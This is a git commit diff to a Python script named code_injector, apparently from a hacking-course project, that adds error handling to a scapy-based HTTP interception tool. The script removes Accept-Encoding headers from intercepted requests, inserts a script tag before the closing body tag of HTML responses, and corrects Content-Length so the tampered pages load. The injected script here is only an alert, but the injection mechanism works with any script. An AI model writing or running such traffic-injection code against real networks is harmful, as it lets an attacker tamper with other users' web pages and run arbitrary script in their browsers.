1446d088f118dfd678424a8788e467c6b90d10a4
Sepp1324 <stoegerer.sebastian@aon.at>
2020-05-27 21:30:06 +0000

    Added ErrorHandling to Code-Injector

--- code_injector/code_injector.py
+++ code_injector/code_injector.py
@@ -6,10 +6,13 @@ import re
 
 def set_load(packet, load):
 	packet[scapy.Raw].load = load
-				
-	del packet[scapy.IP].len
-	del packet[scapy.IP].chksum
-	del packet[scapy.TCP].chksum
+
+	try:		
+		del packet[scapy.IP].len
+		del packet[scapy.IP].chksum
+		del packet[scapy.TCP].chksum
+	except IndexError:
+		pass
 	return packet
 
 
@@ -19,18 +22,22 @@ def process_packet(packet):
 	if scapy_packet.haslayer(scapy.Raw):
 		load = scapy_packet[scapy.Raw].load
 
-		if scapy_packet[scapy.TCP].dport == 80:
-			print("[+] Request")
-			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-		elif scapy_packet[scapy.TCP].sport == 80:
-			print("[+] Response")
-			injection = "<script>alert('CykaBlyat!')</script>"
-			load = load.replace("</body>", injection + "</body>")
-			content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)
+		try:
+			if scapy_packet[scapy.TCP].dport == 80:
+				print("[+] Request")
+				load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+			elif scapy_packet[scapy.TCP].sport == 80:
+				print("[+] Response")
+				injection = "<script>alert('CykaBlyat!')</script>"
+				load = load.replace("</body>", injection + "</body>")
+				content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)
 
-			if content_len_search:
-				content_len = content_len_search.group(1)
-				new_content_len = int(content_len) + len(injection)
+				if content_len_search and "text/html" in load:
+					content_len = content_len_search.group(1)
+					new_content_len = int(content_len) + len(injection)
+					load = load.replace(content_len, str(new_content_len))
+		except IndexError:
+			pass
 
 		if load != scapy_packet[scapy.Raw].load:
 			new_packet = set_load(scapy_packet, load)
